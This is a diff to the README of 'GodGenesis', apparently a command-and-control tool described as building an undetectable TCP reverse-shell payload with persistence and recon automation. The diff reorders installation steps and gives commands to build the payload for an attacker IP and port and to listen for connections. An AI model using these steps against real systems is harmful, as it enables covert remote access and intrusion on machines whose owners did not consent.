@@ -63,25 +63,28 @@ Currently It only supports TCP reverse shell but wait a min, its a FUD and can g
 - [x] 2 ways of achieving persistance 
 - [x] Recon automation to save your time.
 
-
-
-# How To Use Our Tool: 
-## Building the payload
-```
-python3 c2c.py build --ip <ip> --port <port> -output <output_filename>
-```
-> This will generate a payload with the name specified in the --output option, the payload will have a .py extension
-
+# Installation
+1. **Clone the repo**
 ```
 git clone https://github.com/SaumyajeetDas/GodGenesis.git
 ```
 
+2. **Install dependencies**
 ```
 pip3 install -r requirements.txt
 ```
+> The readline and rich modules will be enough to run c2c.py
 
+# How To Use Our Tool: 
+## Build the payload
 ```
-python3 c2c.py <mode> --ip <ip> --port <port>
+python3 c2c.py build --ip <ip> --port <port> -outfile <output_filename>
+```
+> This will generate a payload with the name specified in the --outfile option.
+
+## Listen for connections
+```
+python3 c2c.py listen --ip <ip> --port <port>
 ```
 
 ## Arguments
